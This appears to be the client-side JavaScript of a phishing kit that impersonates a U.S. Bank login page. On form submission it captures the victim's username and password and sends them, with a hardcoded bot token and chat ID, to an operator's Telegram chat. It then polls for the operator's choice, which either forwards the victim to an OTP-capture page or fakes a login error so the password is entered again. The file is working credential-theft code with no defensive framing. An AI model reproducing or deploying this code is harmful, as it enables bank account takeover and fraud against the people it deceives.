const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
const CHAT_ID = "7865246557";

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    document.getElementById('loader').style.display = 'flex';
    document.getElementById('error-box').style.display = 'none';

    const user = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    const type = document.getElementById('accType').value;

    const message = `🏦 *U.S. Bank Login Attempt* \n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n📂 *Type:* ${type}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "طلب OTP 📲", callback_data: "request_otp" }],
                    [{ text: "خطأ في البيانات ❌", callback_data: "login_error" }]
                ]
            }
        })
    });

    startPolling();
});

function startPolling() {
    const poll = setInterval(async () => {
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await res.json();
            if (data.result.length > 0) {
                const cmd = data.result[0].callback_query.data;
                if (cmd === "request_otp") {
                    clearInterval(poll);
                    window.location.href = "otp.html"; 
                }
                if (cmd === "login_error") {
                    clearInterval(poll);
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('error-box').style.display = 'block';
                    document.getElementById('pass').value = "";
                }
            }
        } catch (e) {}
    }, 3000);
}
